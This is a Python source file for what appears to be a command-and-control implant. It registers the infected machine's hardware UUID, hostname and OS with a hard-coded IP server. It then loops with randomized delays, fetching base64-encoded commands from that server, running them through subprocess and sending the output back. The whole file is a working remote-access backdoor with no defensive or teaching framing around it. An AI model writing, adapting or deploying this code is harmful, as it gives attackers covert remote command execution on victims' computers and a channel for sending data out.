from base64 import b64decode
from time import time, sleep
import requests
import platform
import uuid
import subprocess
import random
import psutil
import singleton
import socket


seconds_to_wait = 10
seconds_to_wait_jitter = seconds_to_wait / 2
url = 'http://67.210.114.99:8099'
url_init = url + '/init'
url_check = url + '/check'
id = None
agent_os = None

buff = ""


def init_agent():
    global id, agent_os
    id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    agent_os = platform.system()


def init_request():
    global id, agent_os
    data = {'id': id, 'os': agent_os, 'hostname': socket.gethostname()}
    print(url_init)
    r = requests.post(url_init, json=data)
    print(r.text)


def check_request():
    global id, buff
    data = {'id': id, 'buff': buff}
    r = requests.post(url_check, json=data)
    if r.status_code == 200:
        buff = ""
    print(r.text)
    response = r.json()
    if 'e' in response and response['e'] == 'init':
        return init_request()
    run_commands(response['commands'])


def run_commands(commands):
    global buff
    for command in commands:
        buff = buff + str(run_command(command))


def run_command(command):
    try:
        unpacked_command = str(b64decode(command), "utf-8")
        print(f"Going to execute:\n{unpacked_command}")
        unpacked_command = unpacked_command.replace('\"','\\"')
        unpacked_command = unpacked_command.replace("\'","\\'")
        result = subprocess.run(f'{unpacked_command}', stdout=subprocess.PIPE, text=True)
        print(f"Result was:\n{result.stdout}")
        return result.stdout
    except Exception as e:
        print(f"There was a problem:\n{e}")
        return "\nCOMMAND-FAILED-EXECUTION\n"


if __name__ == '__main__':
    me = singleton.SingleInstance()
    init_agent()
    init_request()
    while True:
        sleep(seconds_to_wait + random.randint(0, seconds_to_wait_jitter))
        check_request()
